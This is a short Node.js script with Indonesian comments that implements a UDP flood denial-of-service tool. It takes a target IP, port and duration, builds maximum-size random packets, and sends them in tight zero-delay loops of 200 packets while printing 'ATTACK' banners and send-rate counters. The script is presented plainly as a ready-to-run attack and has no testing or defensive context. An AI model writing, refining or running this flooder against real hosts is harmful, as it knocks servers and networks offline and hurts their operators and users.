const dgram = require('dgram');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

if (!target || !port || !duration) {
    console.log('Usage: node udp.js <ip> <port> <detik>');
    process.exit(1);
}

// PAYLOAD PALING BERAT - Random + Ukuran Max
const MAX_UDP_SIZE = 65507;

function generateHeavyPayload() {
    // Method 1: Random bytes (paling berat untuk CPU server)
    const payload = Buffer.alloc(MAX_UDP_SIZE);
    for (let i = 0; i < MAX_UDP_SIZE; i++) {
        payload[i] = Math.floor(Math.random() * 2056); // random 0-255
    }
    return payload;
}

// Method 2: Alternatif lebih cepat tapi tetap berat
const crypto = require('crypto');
function generateCryptoPayload() {
    return crypto.randomBytes(MAX_UDP_SIZE);
}

// Pilih salah satu:
const payload = generateHeavyPayload(); // atau generateCryptoPayload()

let packetCount = 0;
console.log(`🔴 ATTACK ke ${target}:${port}`);
console.log(`📦 Payload size: ${MAX_UDP_SIZE} bytes (MAX UDP)`);
console.log(`⏱️  Duration: ${duration} detik\n`);

const socket = dgram.createSocket('udp4');

// Kirim dengan loop lebih agresif
const sendPacket = () => {
    for (let i = 0; i < 200; i++) { // 200 packet per cycle
        socket.send(payload, port, target, (err) => {
            if (!err) packetCount++;
        });
    }
};

const interval = setInterval(sendPacket, 0); // 0ms delay = secepat mungkin

setTimeout(() => {
    clearInterval(interval);
    socket.close();
    console.log(`\n✅ Selesai! Total packet: ${packetCount}`);
    process.exit(0);
}, duration * 1000);

setInterval(() => {
    console.log(`📊 Packet terkirim: ${packetCount} | Rate: ${Math.round(packetCount / (process.uptime()))}/detik`);
}, 1000);
